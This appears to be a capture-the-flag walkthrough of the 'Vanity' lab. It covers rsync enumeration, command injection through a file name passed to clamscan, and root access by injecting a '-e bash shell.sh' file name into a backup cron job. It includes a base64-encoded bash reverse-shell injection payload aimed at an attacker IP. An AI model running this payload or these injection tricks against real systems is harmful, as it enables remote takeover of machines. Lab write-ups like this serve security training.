Vanity

Target IP: 192.168.198.234

Vanity is a motive of immense potency.

Scanning


There are three TCP ports open on the target machine. I will start enumeration with the HTTP application on port 80.

Enumeration

Port 80: HTTP


The webpage above is displayed for this web application. It seems to be an online malware scanner. After performing a directory search and finding nothing except the /uploads directory, I went back to this upload feature.


Uploading a non-malicious file was successful. I uploaded a text file with the content "Hello".


This file got uploaded to the /uploads directory. I tried uploading a PHP file but this did not work. I managed to upload a PHP shell, but it did not work as it compiled the PHP shell inside a HTML.

Port 873: RSYNC


This application is new to me. Looking up on Google lead me to this article. I used the technique above to pentest this port. I found two directories: source and backup. The source directory contains the code for the web application on port 80.


Then I downloaded all the files in this directory to my local machine. The upload.php is interesting.


The upload.php file contains the code above. The code at line 22 is interesting as the binary /usr/bin/clamscan is responsible for checking the file, but the input is passed through system function.


Doing a Google search about clamscan shows there are a few vulnerabilities with one including command injection.

Exploitation


I notice the command injection works. Injecting commands after the filename gets executed by the target machine. In the picture above, the target machine successfully ran the commands id; whoami; ls as the output are shown on the response (right) side of the picture above.


By sending the payload ;echo 'L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNDUuMTY3Lzg0NDMgMD4mMQ=='|base64 -d|bash, I obtained a reverse shell connection on my machine at port 8443. I tried using non-encoded base64 payloads, but I had no luck. After encoding it to base64, I finally got a hit. Now I have a foothold on the target machine.

Privilege Escalation


There is an interesting cronjob called backup.sh. The content of this script are shown above.


Doing a Google search for privesc using this binary shows the interesting flag e which can be used to specify the remote shell to use.




Inside the /var/www/html/uploads directory, I created the reverse shell script inside shell.sh and another file for the command injection so that -e bash shell.sh would be called by the crojob.


And now I have a root shell.
